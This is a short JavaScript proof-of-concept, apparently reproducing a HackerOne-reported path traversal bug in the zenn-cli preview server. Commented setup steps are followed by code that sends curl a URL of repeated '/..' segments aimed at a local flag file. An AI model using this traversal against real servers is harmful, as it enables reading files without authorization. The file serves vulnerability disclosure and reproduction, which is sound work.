//https://hackerone.com/reports/993975
//mkdir zenn-test
//cd zenn-test
//npm init --yes
//npm install zenn-cli
//npx zenn init
//npx zenn new:article
//npx zenn preview -> start server

const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

const fs = require("fs");
const { exec } = require("child_process");
let hostsFile = fs.readFileSync(pathToFlag).toString();

let attack_string = `curl "http://127.0.0.1:8000${genstr()}"`;

exec(attack_string, (error, stdout) => {
  console.log(`${stdout}`);
});
